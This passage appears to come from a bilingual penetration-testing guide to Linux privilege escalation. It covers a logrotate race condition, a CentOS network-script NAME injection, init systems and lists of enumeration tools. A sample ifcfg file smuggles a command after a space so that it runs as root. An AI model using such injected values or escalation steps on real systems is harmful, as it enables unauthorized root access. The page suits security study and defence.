A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.

> [!TIP]
> この脆弱性は`logrotate`のバージョン`3.18.0`およびそれ以前に影響します

More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**脆弱性の参照先:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are ~sourced~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_注: Network と /bin/id の間の空白に注意_)

### **init, init.d, systemd, と rc.d**

ディレクトリ `/etc/init.d` は System V init (SysVinit) 用の **スクリプト** の格納場所です。これは **古典的な Linux サービス管理システム** です。`start`、`stop`、`restart`、場合によっては `reload` サービスを実行するスクリプトが含まれます。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` が使われます。

一方で、`/etc/init` は **Upstart** に関連しており、Ubuntu によって導入された新しい **サービス管理** で、サービス管理タスクのために設定ファイルを使用します。Upstart への移行にもかかわらず、Upstart の互換レイヤーにより SysVinit スクリプトは Upstart の設定と並行して利用され続けています。

**systemd** はモダンな初期化およびサービスマネージャとして登場し、on-demand のデーモン起動、automount 管理、システム状態のスナップショットなどの高度な機能を提供します。配布パッケージ用のファイルは `/usr/lib/systemd/`、管理者による変更用は `/etc/systemd/system/` に整理され、システム管理を合理化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android の rooting フレームワークは一般に syscall をフックして、特権付きカーネル機能を userspace のマネージャに公開します。マネージャの認証が弱い（例: FD-order に基づく署名チェックや脆弱なパスワード方式）と、ローカルアプリがマネージャになりすまして既に root 化されたデバイスで root に昇格できてしまう可能性があります。詳細とエクスプロイトについては以下を参照してください:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## カーネルのセキュリティ保護

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## さらに情報

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux ローカル privilege escalation ベクターを探すのに最適なツール:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と MAC のカーネル脆弱性を列挙 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (物理アクセス):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 参考

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
